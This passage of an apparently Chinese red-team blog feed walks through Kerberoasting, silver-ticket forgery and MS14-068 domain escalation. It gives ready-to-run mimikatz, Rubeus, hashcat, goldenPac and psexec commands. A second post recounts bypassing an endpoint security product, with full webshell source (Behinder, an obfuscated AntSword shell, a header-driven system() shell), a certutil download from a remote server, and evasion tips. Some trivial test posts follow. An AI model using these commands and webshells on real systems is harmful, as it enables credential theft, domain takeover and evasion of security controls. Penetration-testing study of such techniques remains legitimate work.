<li>服务账号密码未设置过期时间，或者与域普通用户密码相同以及账号权限过高等都是问题。</li>
<li>域内具有 Read servicePrincipalName 和 Write serverPrincipalName 的域用户具有注册 SPN 的权利。</li>
</ul>
<p>流程：</p>
<ol>
<li>找到有价值的 SPN（需要满足的条件：该 SPN 注册在域用户帐户下并且域用户账户的权限较高）</li>
<li>请求 TGS</li>
<li>导出 ST</li>
<li>暴力破解</li>
<li>服务票据重写</li>
<li>权限维持</li>
</ol>
<p>前面没有了解到SPN，所以先了解一下SPN之后再回头来做实践。</p>
<h4 id="spn">SPN</h4>
<p>概念：</p>
<p>SPN，全名为：Service Principal Names，即“服务主体名称”。它是域中服务的唯一标识，每个Kerberos服务都必须要有一个SPN，服务在加入域时，会自动注册一个SPN。 如果未进行 SPN 注册或注册失败（名称不唯一），则 Windows 安全层无法确定与 SPN 关联的帐户，因而无法使用 Kerberos 身份验证。</p>
<p>格式：</p>
<p>SPN的格式为：<code>&lt;service class&gt;/&lt;host&gt;:&lt;port&gt;/&lt;service name&gt;</code>，其中service class和host为必需参数。</p>
<ul>
<li>service class为服务类型名称，你可以使用除“/”之外的任何名称（因为SPN使用它作为分隔符），只需要保证它是唯一的名称，但是一般建议使用通用名称，如“www”，“ldap”等</li>
<li>host为运行服务的主机名，可以使用DNS名（如：os.hacker.com）或NetBIOS名（如：os），但要注意的是因为NetBIOS名可能会在林中不唯一，会导致SPN注册失败。</li>
<li>host为可选参数，同一服务在同一host上运行时，使用此来加以区别。服务仅使用默认端口时（如80），可以省略。</li>
<li>service name为服务实例名称，不太重要，微软有个这样的例子:MyDBService/host1/CN=hrdb,OU=mktg,DC=example,DC=com</li>
</ul>
<p>一个SPN命名实例：<code>MySQLSvc/os.hacker.com:3306</code> 或 <code>MySQLSvc/hacker</code>等。</p>
<p>分类：</p>
<ul>
<li>当一个服务的权限为 Local System 或 Network Service，则 SPN 会自动注册在机器帐户下。</li>
<li>当一个服务的权限为一个域用户，则 SPN 需要手动注册在域用户帐户下。</li>
</ul>
<p>验证：</p>
<p>在 Kerberos 验证第 3 步中，client 向 TGS 发送 TGT 的同时，发送需要访问服务的 SPN；在第 4 步，TGS 会查询对应 SPN 的服务记录，找到服务后开始验证 TGT，最后 TGS 生成对应 SPN 服务的 ST 票据。</p>
<h5 id="查询spn">查询SPN</h5>
<p>对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测。</p>
<h5 id="使用setspn">使用SetSPN</h5>
<p>Win7和Windows Server2008自带的工具</p>
<p>查看当前域内的所有SPN：</p>
<pre><code class="language-html">setspn.exe -q */*
</code></pre>
<figure data-type="image" tabindex="41"><img src="https://redteamblog.icu/post-images/assets/image-20220322172723-gm88pui.png" alt="image.png" loading="lazy"></figure>
<p>查看redteam.com域内的所有SPN：</p>
<pre><code class="language-html">setspn.exe -T redteam.com -q */*
</code></pre>
<figure data-type="image" tabindex="42"><img src="https://redteamblog.icu/post-images/assets/image-20220322172643-i6cxyr2.png" alt="image.png" loading="lazy"></figure>
<h4 id="实现kerberoasting攻击的前提">实现Kerberoasting攻击的前提</h4>
<ul>
<li>对于kerberos协议认证过程中返回的tgs_reply，在已知加密算法的前提下，我们可以尝试穷举口令。( <strong>服务密码一般默认为弱密码</strong> )</li>
<li>Windows系统通过SPN查询获得服务和服务实例帐户的对应关系</li>
<li>域内的主机都能查询SPN。</li>
<li>域内的任何用户都可以向域内的任何服务请求TGS。</li>
</ul>
<h5 id="申请st票据">申请ST票据</h5>
<p>前面提到过寻找有价值的SPN服务，那么什么是有价值的呢</p>
<p><strong>可以远程连接，高权限</strong> ，因为计算机域帐户不可以远程连接，所以我们目标一般都是域用户。</p>
<p>使用Rubeus工具</p>
<p><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
<p>这是一个专门针对Kerberos的工具包。</p>
<pre><code class="language-html">#依赖.net环境
Rubeus.exe kerberoast
</code></pre>
<figure data-type="image" tabindex="43"><img src="https://redteamblog.icu/post-images/assets/image-20220323095223-w9wmxlv.png" alt="image.png" loading="lazy"></figure>
<p>将哈希保存为hash.txt文件，放到hashcat的目录下。使用命令</p>
<pre><code class="language-html">hashcat64.exe -m 13100 hash.txt pass.txt
</code></pre>
<h6 id="使用powershell命令请求">使用Powershell命令请求</h6>
<p>使用微软提供的类KerberosRequestorSecurityToken发起Kerberos请求，申请指定SPN的ST票据。Kerberos 协议中请求的票据会保存在内存中，可以通过 klist 命令查看当前会话存储的 kerberos 票据</p>
<pre><code>#请求服务票据
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;SPN名&quot;
#New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/WIN-7.bean.testlab:1433&quot;

#列出服务票据
klist
</code></pre>
<h6 id="使用mimikatz请求">使用mimikatz请求</h6>
<p>申请指定SPN的ST票据</p>
<pre><code>#请求服务票据
kerberos::ask /target:MSSQLSvc/WIN-7.bean.testlab:1433

#列出服务票据
kerberos::list

#清除所有票据
kerberos::purge
</code></pre>
<h6 id="使用impacket中的getuserspns请求">使用Impacket中的GetUserSPNs请求</h6>
<p>需要提供域账户密码才能使用，该脚本会直接输出hashcat格式的服务票据，可以直接使用hashcat进行爆破</p>
<pre><code>#GetUserSPNs.exe -request -dc-ip x.x.x.x 域名称/域用户:密碼
GetUserSPNs.exe -request -dc-ip 172.16.1.1 bean.testlab/test:test123456 &gt; r.txt
</code></pre>
<h5 id="导出服务票据">导出服务票据</h5>
<p>查看票据列表可用一些命令：</p>
<pre><code>#cmd
klist

#mimikatz
mimikatz.exe &quot;kerberos::list&quot;

#MSF
load kiwi
kerberos_ticket_list
或
load kiwi
kiwi_cmd kerberos::lists
</code></pre>
<p>导出：</p>
<pre><code>#mimikatz 导出后缀为.kirbi
mimikatz.exe &quot;kerberos::list /export&quot; &quot;exit&quot;

#Empire下的Invoke-Kerberos.ps1
powershell.exe -exec bypass -Command &quot;&amp; {Import-Module .\Invoke-Kerberoast.ps1;Invoke-Kerberoast -outputFormat Hashcat}&quot;
</code></pre>
<h5 id="暴力破解">暴力破解</h5>
<p>tgsrepcrack.py</p>
<p>kerberoast工具包中的tgsrepcrack.py，<strong>可直接对mimikatz导出.kirbi文件进行破解</strong></p>
<pre><code>python tgsrepcrack.py pass.txt xx.kirbi
</code></pre>
<figure data-type="image" tabindex="44"><img src="https://redteamblog.icu/post-images/assets/image-20220323103324-l2zl16m.png" alt="image.png" loading="lazy"></figure>
<p>tgscrack</p>
<p>下载地址：<a href="https://github.com/leechristensen/tgscrack">tgscrack</a></p>
<pre><code class="language-html">python2 extractServiceTicketParts.py xxx.kirbi &gt; hash.txt
go run tgscrack.go -hashfile hash.txt -wordlist pass.txt
</code></pre>
<figure data-type="image" tabindex="45"><img src="https://redteamblog.icu/post-images/assets/image-20220323103357-sa8aijd.png" alt="image.png" loading="lazy"></figure>
<p>hashcat</p>
<p>前面好几种导出hash的方式，都可以使用hashcat来爆破</p>
<pre><code>hashcat.exe -m 13100 hash.txt pass.txt
</code></pre>
<figure data-type="image" tabindex="46"><img src="https://redteamblog.icu/post-images/assets/clip-20220323092140-pgyx400.png" alt="Image" title="Image" loading="lazy"></figure>
<h6 id="服务票据重写ram注入">服务票据重写&amp;RAM注入</h6>
<p>ST票据使用服务密码的NTLM哈希签名。如果票据散列已被破解，那么可以使用Kerberoast python脚本重写票据。这将允许在服务被访问时模拟任何域用户或伪造账户。此外，提权也是可能的，因为用户可以被添加到诸如域管理员的高权限组中。</p>
<pre><code>python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -u 500
python kerberoast.py -p Password123 -r PENTESTLAB_001.kirbi -w PENTESTLAB.kirbi -g 512
</code></pre>
<p>使用以下Mimikatz命令将新票据重新注入内存，以便通过Kerberos协议对目标服务执行身份验证。</p>
<pre><code>kerberos::ptt PENTESTLAB.kirbi
</code></pre>
<h6 id="参考">参考</h6>
<p><a href="https://www.cnblogs.com/backlion/p/15652052.html">域渗透-SPN</a></p>
<h4 id="白银票据">白银票据</h4>
<p>在TGS-REP阶段，TGS_REP里面的ticket的enc-part是使用服务的hash进行加密的，如果我们拥有服务的hash，就可以给我们自己签发任意用户的TGS票据，这个票据也被称为白银票据。相较于黄金票据，白银票据使用要访问服务的hash，而不是krbtgt的hash，由于生成的是TGS票据，不需要跟域控打交道，所以可以绕过域控制器，很少留下日志。而黄金票据在利用过程中由KDC颁发TGT，并且在生成伪造的TGT得20分钟内，TGS不会对该TGT的真伪进行效验。如果说黄金票据是伪造的TGT,那么白银票据就是伪造的ST，所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是白银票票据只能访问特定服务。但是要注意的一点是，伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名，则银票将不起作用。</p>
<h5 id="白银票据的特点">白银票据的特点</h5>
<p>1.白银票据是一个有效的票据授予服务（TGS）Kerberos票据，因为Kerberos验证服务运行的每台服务器都对服务主体名称的服务帐户进行加密和签名。</p>
<p>2.黄金票据是伪造TGT并且有效的获得任何Kerberos服务，而白银票据是伪造TGS。这意味着白银票据仅限于特定服务器上的任何服务。</p>
<p>3.大多数服务不验证PAC（通过将PAC校验和发送到域控制器进行PAC验证），因此使用服务帐户密码哈希生成的有效TGS可以完全伪造PAC</p>
<p>4.攻击者需要服务帐户密码哈希值</p>
<p>5.TGS是伪造的，所以没有和TGT通信，意味着DC从验证过。</p>
<p>6.任何事件日志都在目标服务器上。</p>
<h6 id="白银票据和黄金票据区别">白银票据和黄金票据区别</h6>
<ul>
<li>获取的权限不同<br>
金票：伪造的TGT，可以获取任意Kerberos的访问权限<br>
银票：伪造的ST，只能访问指定的服务，如CIFS</li>
<li>认证流程不同<br>
金票：同KDC交互，但不同AS交互<br>
银票：不同KDC交互，直接访问Server</li>
<li>加密方式不同<br>
金票：由krbtgt NTLM Hash 加密<br>
银票：由服务账号 NTLM Hash 加密</li>
</ul>
<h6 id="白银票据实践">白银票据实践</h6>
<p>我们伪造凭证，需要以下信息</p>
<ul>
<li>要伪造的域用户(任意用户或者不存在的用户，这里我们一般填写域管理员账户)</li>
<li>域名</li>
<li>域的SID值(就是域成员SID值去掉最后的一节)</li>
<li>目标服务的FQDN（FQDN：全限定域名，同时带有主机名和域名的名称。如：dc.bean.testlab）</li>
<li>可利用的服务</li>
<li>域服务账户NTLM哈希</li>
<li>只有KDC能制作和查看PAC。</li>
</ul>
<h5 id="白银票据的服务列表"><strong>白银票据的服务列表</strong></h5>
<pre><code>服务名称                    同时需要的服务
WMI                        HOST、RPCSS
PowerShell Remoting        HOST、HTTP
WinRM                    HOST、HTTP
Scheduled Tasks            HOST
Windows File Share        CIFS
LDAP                    LDAP
Windows Remote Server    RPCSS、LDAP、CIFS
</code></pre>
<p>除上述外目标机器不能开启PAC（特权属性证书）验证，PAC用于客户端和服务端交互阶段用于鉴权，带有签名，如果没有krbtgt的hash以及服务的hash就没办法伪造有效的签名。（MS14-068可绕过）</p>
<pre><code class="language-html">#域控下执行
mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; 1.txt

#也可使用dcsync在其他机器的域管账户下执行，用户填域控的机器名
mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:bean.testlab /user:dc$&quot; &quot;exit&quot; &gt; 1.txt
</code></pre>
<figure data-type="image" tabindex="47"><img src="https://redteamblog.icu/post-images/assets/image-20220323115150-gldyx07.png" alt="image.png" loading="lazy"></figure>
<p>e49051446e697bb3f91bac430da93c3e</p>
<p>S-1-5-21-767623950-3225260823-3670188588</p>
<h4 id="伪造cifs">伪造CIFS</h4>
<p>伪造CIFS权限，CIFS常用于主机之间的文件共享</p>
<pre><code class="language-html">#mimikatz.exe &quot;kerberos::golden /domain:域名 /sid:域SID /target:目标的FQDN /service:服务类型 /rc4:NTLMHash /user:伪造的用户名 /ptt&quot;

mimikatz.exe ”kerberos::golden /domain:redteam.com /sid:S-1-5-21-767623950-3225260823-3670188588 /target:dc.redteam.com /service:cifs /rc4:e49051446e697bb3f91bac430da93c3e /user:administrator /ptt“

* /domain：域名
* /sid ；sid值
* /target：域控制器全称
* /service：需要指定相关的服务名，此处为cifs
* /rc4:域控的计算机账户ntlm hash
*  /user：要伪造的用户名，任意写

dir \\dc\c$
</code></pre>
<figure data-type="image" tabindex="48"><img src="https://redteamblog.icu/post-images/assets/0d3ce145bfd91b6d12a74820d58a58e-20220323123354-qxvt9dg.png" alt="0d3ce145bfd91b6d12a74820d58a58e.png" loading="lazy"></figure>
<p>访问DC成功。</p>
<h2 id="kerberos协议的各阶段攻击手法">Kerberos协议的各阶段攻击手法</h2>
<figure data-type="image" tabindex="49"><img src="https://redteamblog.icu/post-images/assets/clip_13-20220311155316-n4g07of.png" alt="Image" title="Image" loading="lazy"></figure>
<h2 id="ms14-068域提权">MS14-068域提权</h2>
<p><strong>一、漏洞说明</strong></p>
<pre><code>  改漏洞可能允许攻击者将未经授权的域用户账户的权限,提权到域管理员的权限。

  微软官方解释: https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2014/ms14-068
</code></pre>
<p><strong>二、漏洞原理</strong></p>
<pre><code>  Kerberos认证原理:https://www.cnblogs.com/huamingao/p/7267423.html

  服务票据是客户端直接发送给服务器,并请求服务资源的。如果服务器没有向域控dc验证pac的话,那么客户端可以伪造域管的权限来访问服务器。
</code></pre>
<p><strong>三、漏洞利用前提</strong></p>
<p>1.域控没有打MS14-068的补丁</p>
<p>2.攻击者拿下了一台域内的普通计算机,并获得普通域用户以及密码/hash值，以及用户的suid</p>
<p><strong>四、工具下载</strong></p>
<p>Ms14-068.exe 下载地址:https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</p>
<p>PSexec 下载地址:https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe</p>
<p>mimikatz 下载地址:https://github.com/gentilkiwi/mimikatz/releases</p>
<p><strong>五、漏洞利用</strong></p>
<p>如果当前用户为域用户</p>
<p>可以直接用 whoami /user 获取sid</p>
<figure data-type="image" tabindex="50"><img src="https://redteamblog.icu/post-images/assets/image-20220328103552-5ugwlvm.png" alt="image.png" loading="lazy"></figure>
<p>如果不是只是本地用户可以用mimikatz 抓取本地的域用户密码</p>
<p>记住mimikatz要有管理员权限不然无法抓取内存密码，可以以管理员权限运行。</p>
<figure data-type="image" tabindex="51"><img src="https://redteamblog.icu/post-images/assets/image-20220328103647-87lrxis.png" alt="image.png" loading="lazy"></figure>
<h3 id="利用ms14-068exe-工具生成伪造的kerberos协议认证证书">利用ms14-068.exe 工具生成伪造的kerberos协议认证证书</h3>
<p>MS14-068.exe -u <userName>@<domainName> -p <clearPassword> -s <userSid> -d <domainControlerAddr></p>
<p>ms-14-068.exe -u   域用户@域控名  -p 域用户密码 -s 域用户sid -d 域ip</p>
<figure data-type="image" tabindex="52"><img src="https://redteamblog.icu/post-images/assets/image-20220328103753-47ho0q0.png" alt="image.png" loading="lazy"></figure>
<p>利用mimikatz.exe将证书写入，从而提升为域管理员</p>
<p>kerberos::ptc 你的证书名字</p>
<p>kerberos::ptc TGT_zhangsan@ggyao.com.ccache</p>
<p>写入成功后，成功dir域控C盘</p>
<figure data-type="image" tabindex="53"><img src="https://redteamblog.icu/post-images/assets/image-20220328103916-44w88zo.png" alt="image.png" loading="lazy"></figure>
<h3 id="使用psexecexe获取一个交互式shell">使用psexec.exe获取一个交互式shell</h3>
<p>psexec.exe \WIN-2008-DC.ggyao.com cmd</p>
<figure data-type="image" tabindex="54"><img src="https://redteamblog.icu/post-images/assets/image-20220328104019-8sunvsb.png" alt="image.png" loading="lazy"></figure>
<p>psexec执行单条命令：<br>
psexec.exe \WIN-2008-DC.ggyao.com cmd /c “ipconfig”</p>
<figure data-type="image" tabindex="55"><img src="https://redteamblog.icu/post-images/assets/image-20220328104029-2f7onso.png" alt="image.png" loading="lazy"></figure>
<h3 id="方法2goldenpacexe推荐使用">方法2：goldenPac.exe（推荐使用）</h3>
<p>（https://github.com/maaaaz/impacket-examples-windows）<br>
此工具是impacket工具包里的，它是MS14-068+psexec的组合，因此使用起来非常放方便快捷。<br>
goldenPac.exe ggyao.com/zhangsan:Aatesttest@WIN-2008-DC.ggyao.com</p>
<figure data-type="image" tabindex="56"><img src="https://redteamblog.icu/post-images/assets/image-20220328104102-ton5t02.png" alt="image.png" loading="lazy"></figure>
<h3 id="方法3kekeoexe">方法3：kekeo.exe</h3>
<p>（https://github.com/gentilkiwi/kekeo/releases）<br>
通过kekeo.exe获取域控权限，此工具并非每次都能成功利用。<br>
kekeo.exe “exploit::ms14068 /domain:ggyao.com /user:zhangsan /password:Aatesttest /ptt” “exit”</p>
<figure data-type="image" tabindex="57"><img src="https://redteamblog.icu/post-images/assets/image-20220328104140-frff7op.png" alt="image.png" loading="lazy"></figure>
<h3 id="注意事项">注意事项</h3>
<p>1.票据伪造的机器不一定需要在域里，将DNS指向域控，能解析就行。</p>
<p>2.IPC$访问域控的时候需要使用主机名，不能使用IP。</p>
<h3 id="漏洞原理">漏洞原理：</h3>
<p>其实出现这个问题的关键点在于PAC(特权属性证书:验证用户所拥有的权限)</p>
<p>先大致回顾一下Kerberos的认证流程</p>
<ul>
<li>域用户登录，向KDC的AS服务发送自身密码加密的时间戳进行预认证；</li>
<li>DC的AS服务验证用户密码是否正确。若正确，返回一张TGT票据，该票据为krbtgt密码加密而成；</li>
<li>域用户凭借TGT票据向KDC的TGS服务申请访问某Server服务的票据；</li>
<li>域控的TGS服务验证TGT后，返回给域用户能够访问该Server服务的票据(ST, TGS Ticket)；</li>
<li>域用户拿着ST访问对应的Server服务；</li>
<li>该Server服务验证ST，决定是否允许让域用户访问。</li>
</ul>
<p>其中，PAC是默认包含在TGT中的；</p>
<p>通常情况下，AS_REQ 请求中如果include-pac被置为 true，只要 AS 服务通过了域用户的认证，则会在返回的 AS_REP 数据包中的 TGT 中加入 PAC 信息；</p>
<p>而如果在 AS_REQ 请求时，include-pac被置为 false，则 AS_REP 返回的 TGT 中就不会包含 PAC 信息。</p>
<p>于是在AS_REP返回的TGT中没有PAC信息后，域用户则可以伪造&quot;恶意&quot;的PAC放入TGS_REQ中，KDC解密PAC后会再次加密到一个新的TGT中并返回给域用户，此时的TGT中已经携带了“恶意”PAC，也就达到漏洞利用的目的。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[浅谈bypass金山终端安全系统的心路历程]]></title>
        <id>https://redteamblog.icu/post/qian-tan-bypass-jin-shan-zhong-duan-an-quan-xi-tong-de-xin-lu-li-cheng/</id>
        <link href="https://redteamblog.icu/post/qian-tan-bypass-jin-shan-zhong-duan-an-quan-xi-tong-de-xin-lu-li-cheng/">
        </link>
        <updated>2022-04-23T06:35:55.000Z</updated>
        <content type="html"><![CDATA[<h1 id="关于金山终端的bypass心路历程">关于金山终端的bypass心路历程</h1>
<h3 id="浅谈bypass金山终端安全系统的心路历程"><strong>浅谈bypass金山终端安全系统的心路历程</strong></h3>
<h3 id="1漏洞详情"><strong>1.漏洞详情</strong></h3>
<p>任意文件下载</p>
<figure data-type="image" tabindex="1"><img src="https://redteamblog.icu/post-images/1650697624370.png" alt="" loading="lazy"></figure>
<pre><code>/htmltopdf/downfile.php?filename=xxx

/conf
/.ssh
.....
</code></pre>
<p>任意文件上传</p>
<figure data-type="image" tabindex="2"><img src="https://redteamblog.icu/post-images/1650697685858.png" alt="" loading="lazy"></figure>
<h3 id="2getshell"><strong>2.getshell</strong></h3>
<p>遇到几个问题</p>
<p>1.上传任意文件被秒删，只能存活一秒。</p>
<p>2.php的 <code>eval、create_function、base64_decode</code> 等敏感函数被杀，以及函数不能传递任何参数，但system等命令执行函数能执行。</p>
<p>3.无法执行敏感命令操作，比如 <code>net user /add</code> ，ps反弹cs等。</p>
<p>对于第一个问题，虽然只能存活一秒，但是能执行成功，我们可以往其他目录写shell。比如</p>
<pre><code class="language-php">&lt;?php file_put_contents(&quot;../../xx.php&quot;,'xxxx');
</code></pre>
<p>这样可以解决第一个问题，我们可以写shell到其他目录来bypass。</p>
<p>第二个问题，<code>eval</code> 函数被禁用，不能传递参数，需要传递参数的shell均无法执行。比如冰蝎</p>
<pre><code class="language-php">&lt;?php
@error_reporting(0);
session_start();
    $key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
    $_SESSION['k']=$key;
    session_write_close();
    $post=file_get_contents(&quot;php://input&quot;);
    if(!extension_loaded('openssl'))
    {
        $t=&quot;base64_&quot;.&quot;decode&quot;;
        $post=$t($post.&quot;&quot;);

        for($i=0;$i&lt;strlen($post);$i++) {
                 $post[$i] = $post[$i]^$key[$i+1&amp;15];
                }
    }
    else
    {
        $post=openssl_decrypt($post, &quot;AES128&quot;, $key);
    }
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
    class C{public function __invoke($p) {eval($p.&quot;&quot;);}}
    @call_user_func(new C(),$params);
?&gt;
</code></pre>
<p>简单观察一下冰蝎的马，首先是有post传参，然后是 <code>eval</code> 函数，所以pass了。然后我们先观察蚁剑的插件生成的免杀马</p>
<pre><code class="language-php">&lt;?php
class JADE {
    function aoMy() {
        $mmaQ = &quot;\x29&quot; ^ &quot;\x48&quot;;
        $kndi = &quot;\xda&quot; ^ &quot;\xa9&quot;;
        $yRpX = &quot;\xb7&quot; ^ &quot;\xc4&quot;;
        $tHGH = &quot;\x1f&quot; ^ &quot;\x7a&quot;;
        $EBzf = &quot;\x35&quot; ^ &quot;\x47&quot;;
        $WFrO = &quot;\x4b&quot; ^ &quot;\x3f&quot;;
        $iGgJ =$mmaQ.$kndi.$yRpX.$tHGH.$EBzf.$WFrO;
        return $iGgJ;
    }
    function __destruct(){
        $KUht=$this-&gt;aoMy();
        @$KUht($this-&gt;rx);
    }
}
$jade = new JADE();
@$jade-&gt;rx = isset($_GET['id'])?base64_decode($_POST['qwq']):$_POST['qwq'];
?&gt;
</code></pre>
<p>特征很明显。再来看看蚁剑自带的。</p>
<pre><code class="language-php">&lt;?php
    $YCgX=create_function(chr(7560/210).chr(645-530).chr(01674-01515).base64_decode('bQ==').str_rot13('r'),chr(0265370/01630).chr(0324020/01630).str_rot13('n').str_rot13('y').str_rot13('(').str_rot13('$').chr(0252733/01371).chr(01275-01116).str_rot13('z').chr(204-103).base64_decode('KQ==').chr(21948/372));
$YCgX(base64_decode('OTE3M'.'DMwO0'.'BldkF'.'sKCRf'.''.str_rot13('H').base64_decode('RQ==').chr(225-168).chr(01154-01030).chr(0160150/01234).''.''.chr(25410/363).chr(384-268).str_rot13('0').base64_decode('Wg==').base64_decode('WA==').''.'N0XSk'.'7Mjc1'.'MTA5M'.'Ds='.''));?&gt;
</code></pre>
<p>通过<code>str_rot13</code>和<code>base64</code>相关的字符串处理函数来进行bypass，但是明显有create_function函数在，也被过滤了，后面猜想企业终端云防护应该收录了这种公开的shell，常规bypass应该绕不过。</p>
<p>经过n多种尝试，发现并不能达成直接连上冰蝎或者蚁剑的要求，转换思路尝试写个没有参数传递的能执行命令的伪shell</p>
<p><strong>php无参数rce</strong>，ctf多年前的考点，比如。</p>
<pre><code class="language-php">&lt;?=system(end(getallheaders()));
</code></pre>
<p>当时时间紧迫，只是临时构造了个demo，关于无参数rce还有很多形式的方法。</p>
<h3 id="3获取权限"><strong>3.获取权限</strong></h3>
<p>第二个问题解决了。来到了第三个问题，如何进一步获取主机权限？首先尝试了各种方法。比如</p>
<p>1.远程ps上线（毫无意外的被拦截，应该是云防护拦截的</p>
<p>2.通过<code>net user /add</code>操作添加用户然后3389连，当然这儿已经在内网了，所以可以直接连接。(被拦)</p>
<p>也尝试利用<code>C:\Windows\System32\net1.exe</code>来进行添加，或者通过<code>COPY</code>命令复制<code>net1.exe</code>来绕过防护，比如</p>
<pre><code class="language-powershell">COPY C:\Windows\System32\net1.exe C:\Users\Public\test
start test user xxx /add
</code></pre>
<p>很遗憾被拦截了。</p>
<p>最后经过ping探测，发现出网，决定利用<code>certutil</code>来实现远程下载。比如</p>
<pre><code class="language-bash">certutil -urlcache -split -f http://vps/xxx xxx
</code></pre>
<p>简单服务器起个<code>http</code>服务之后发现可以下载。不过当下载<code>exe</code>的时候发现被拦截了。直接改成其他后缀绕过。</p>
<p>后面思路就很明显了，远程下载exe然后直接上线。然后又被拦截了，想着难道还要我做免杀？</p>
<p>当时已经深夜了，做免杀未免太耗时间，想着添加个管理员用户直接3389连。但是前面的net命令又被禁用了。又来到了熟悉的bypass环节。</p>
<p><strong>使用windows api添加用户</strong></p>
<p>这个方法在去年hw被大家广泛使用。贴个github项目</p>
<pre><code class="language-powershell">https://github.com/lengjibo/NetUser
</code></pre>
<p>原理在这不做过多阐述，大概就是利用windows自带的接口进行相关操作。最后结果图</p>
<figure data-type="image" tabindex="3"><img src="https://redteamblog.icu/post-images/1650697694881.png" alt="" loading="lazy"></figure>
<h3 id="4常见的shellcode免杀"><strong>4.常见的shellcode免杀</strong></h3>
<p>对于一个web手来说，让我们手写shellcode来bypass杀软有点过分，所以或多或少需要借助已有轮子，这里推荐大家用go来生成相关的木马。</p>
<p>对于go生成的木马特征不是很明显，不过还是容易被识别出来，所以我们需要借助混淆、清除特征来进行隐藏。</p>
<p>对于已有的轮子推荐</p>
<p>go-strip：用来清除go编译的特征以及函数名混淆（当然，go编译的参数也可以进行初步特征清除</p>
<p>garble：很多人使用（在go编译的时候就会进行字节码、函数相关的混淆，过火绒应该还是没问题</p>
<p><strong>web手的进一步免杀工程</strong></p>
<p>通过研究已有项目进行免杀</p>
<pre><code>https://github.com/safe6Sec/GolangBypassAV
</code></pre>
<p>常见的是静态免杀，比如隐藏图片，分离，核心都一样，隐藏特征</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[test312131]]></title>
        <id>https://redteamblog.icu/post/test312131/</id>
        <link href="https://redteamblog.icu/post/test312131/">
        </link>
        <updated>2022-04-23T03:52:31.000Z</updated>
        <content type="html"><![CDATA[<p>231312313</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[多级目录测试]]></title>
        <id>https://redteamblog.icu/post/duo-ji-mu-lu-ce-shi/</id>
        <link href="https://redteamblog.icu/post/duo-ji-mu-lu-ce-shi/">
        </link>
        <updated>2022-04-22T20:17:54.000Z</updated>
        <content type="html"><![CDATA[<p>weqweqq</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[test]]></title>
        <id>https://redteamblog.icu/post/suibi2/</id>
        <link href="https://redteamblog.icu/post/suibi2/">
        </link>
        <updated>2022-04-22T20:15:54.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<p>1231</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[这是另外一篇随笔的测试]]></title>
        <id>https://redteamblog.icu/post/suibi/</id>
        <link href="https://redteamblog.icu/post/suibi/">
        </link>
        <updated>2022-04-22T20:13:37.000Z</updated>
        <content type="html"><![CDATA[<p>这是另外一篇随笔的测试</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[这是一篇测试内容]]></title>
        <id>https://redteamblog.icu/post/test/</id>
        <link href="https://redteamblog.icu/post/test/">
        </link>
        <updated>2022-04-22T19:06:44.000Z</updated>
        <content type="html"><![CDATA[<p>test</p>
]]></content>
    </entry>
</feed>